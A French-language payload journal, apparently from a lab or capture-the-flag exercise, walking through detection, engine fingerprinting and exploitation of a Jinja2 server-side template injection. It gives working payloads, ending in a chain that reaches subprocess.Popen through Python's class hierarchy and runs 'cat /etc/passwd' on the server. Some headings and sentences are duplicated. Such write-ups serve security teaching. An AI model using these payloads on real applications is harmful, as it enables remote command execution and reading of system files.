Journal des Payloads - Exploitation d'une Faille SSTI

Etape 1 : Détection de la Vulnérabilité

L'objectif initial était de confirmer si l'entrée utilisateur était interprétée par le serveur.

Payload 1.1 : Test d'Évaluation Mathématique

* Payload : {{ 6*7 }}
* Objectif : Vérifier si le moteur de template exécute des expressions simples.
* Résultat Attendu : L'affichage du résultat 42 au lieu de la chaîne de caractères {{ 6*7 }}.

* Conclusion : Le résultat a confirmé que le serveur évaluait le code à l'intérieur des délimiteurs {{ }}. La vulnérabilité SSTI est confirmée.


Etape 2 : Quelle moteur de template ?

Une fois la faille avérée, il fallait identifier la technologie sous-jacente pour adapter l'exploitation.


Étape 2 : L'Identification (Quel moteur de template ?)

Une fois la faille confirmée, il faut savoir à qui on parle. Jinja2 (Python), Twig (PHP), FreeMarker (Java)... chacun a sa propre "grammaire" et ses propres objets.
	
{{ 6 * 7 }} —> {{42}}  Jinja2 (Python) ou Twig (PHP) 

${ 6 * 7 } —> {{42}} FreeMarker (Java) ou Velocity.

<%= 6 * 7 %> —> {{42}} ERB (Ruby).

@{ 6 * 7 } —> {{42}} Razor (.NET).


d’après le résultat Soit on est en Jinja2 (Python) ou en Twig (PHP) 


Ensuite il faut savoir si c’est Jinja2 (Python) ou Twig (PHP) : 
{{ '7' * 7 }}

* Si le serveur répond 7777777 : C'est la signature typique de Jinja2 (Python). Python permet de "multiplier" une chaîne de caractères.

* Si le serveur répond 49 (PHP essaie de convertir '7' en nombre) ou renvoie une erreur : C'est le comportement attendu de Twig (PHP).


Le résultat a confirmé que le moteur de template était très probablement Jinja2, nous orientant vers des techniques d'exploitation spécifiques à l'écosystème Python


Etape 3 : Exploitation de la faille 

L'objectif final était de lire le fichier /etc/passwd. Pour cela, nous avons construit le payload final par étapes successives.

Le Principe : Utiliser la Nature Orientée Objet de Python

Python est un langage de programmation orienté objet. Cela signifie que chaque élément manipulé (un nombre, un texte, etc.) est un "objet" qui appartient à une "famille" (une classe). Chaque objet possède une carte d'identité (__class__) et un arbre généalogique (__mro__). 
__mro__ est l'acronyme de Method Resolution Order (Ordre de Résolution des Méthodes). Plus simplement, c'est l'arbre généalogique de la classe. Il liste dans l'ordre la classe elle-même, puis ses parents, puis ses grands-parents, jusqu'à l'ancêtre ultime.


 Notre stratégie consiste à exploiter cette structure pour remonter d'un objet anodin jusqu'au sommet de la hiérarchie, afin d'obtenir une vue d'ensemble de tous les outils disponibles sur le serveur.

Payload 3.1 : La Phase d'Induction - Remonter à la Source Universelle

Notre premier raisonnement est inductif : nous partons d'un cas particulier et connu (un objet simple) pour en tirer une capacité générale et puissante.
* Objectif : Obtenir une liste de toutes les classes chargées par l'application pour y trouver des modules nous permettant d’accéder, de lire et d’afficher le contenu de /etc/passwd.
* Payload : {{ ''.__class__.__mro__[1].__subclasses__() }}


- En sélectionnant [1], on isole cet ancêtre ultime : la classe object, commune à tous les objets en Python.

Nous sommes passés d'un simple string à la classe mère de tout l'écosystème Python. C'est notre phase d'induction.

La Phase de Déduction - Identifier et Utiliser l'Outil Cible

* Résultat : La méthode .__subclasses__() appliquée à l'ancêtre object nous donne une liste exhaustive de toutes les classes disponibles, notre "carte" des outils internes du serveur.

À partir de ce moment, notre raisonnement devient déductif. De la liste générale de tous les outils possibles, nous allons déduire et sélectionner l'outil spécifique dont nous avons besoin pour notre mission.


Payload 3.2 : Isoler un Outil d'Exécution de Commandes


L'objectif final était de lire le fichier /etc/passwd. Pour cela, nous avons construit le payload final par étapes successives.

* La Cible (subprocess.Popen) : Dans l'écosystème Python, la classe subprocess.Popen est l'outil le plus puissant et le plus direct pour cela. Elle est conçue pour créer de nouveaux processus, ce qui nous permet d'exécuter n'importe quelle commande système (comme cat, ls, whoami, etc.) comme si nous étions dans un terminal sur le serveur. La trouver dans la liste des classes est l'équivalent de trouver une clé universelle.

* La Méthode (Utilisation d'un script) : La liste obtenue à l'étape 3.1 était beaucoup trop grande pour une recherche manuelle. Pour localiser subprocess.Popen de manière efficace et précise, nous avons utilisé un script Python externe sur notre propre machine. Nous avons copié la sortie brute du serveur dans ce script, qui a analysé le texte pour nous retourner l'index exact de notre cible


* Payload : {{ ''.__class__.__mro__[1].__subclasses__()[214] }}
* Objectif : Après analyse de la liste précédente, isoler la classe subprocess.Popen (située à l'index 214), connue pour permettre l'exécution de commandes système.

* Résultat : L'affichage unique de <class 'subprocess.Popen'>, confirmant que nous avions bien sélectionné notre outil.


.
Résultat : Notre script a déterminé que <class 'subprocess.Popen'> se trouvait à la position 214. L'injection du payload ci-dessus a permis de l'isoler et d'afficher uniquement <class 'subprocess.Popen'>, confirmant que nous avions bien sélectionné notre outil et que nous étions prêts pour l'attaque finale.



Payload 3.3 : Exécution de Commande et Lecture de Fichier (Payload Final)

* Payload : {{ ''.__class__.__mro__[1].__subclasses__()[214](['cat', '/etc/passwd'], stdout=-1).stdout.read() }}

* Objectif :
    1. Utiliser subprocess.Popen ([214]) pour exécuter la commande cat /etc/passwd.
    2. stdout=-1 indique de capturer la sortie de la commande.
    3. .stdout.read() lit et affiche cette sortie.
* Résultat : Le contenu complet du fichier /etc/passwd a été affiché sur la page web.
* Conclusion : L'exploitation fonctionne, démontrant un accès en lecture au système de fichiers du serveur.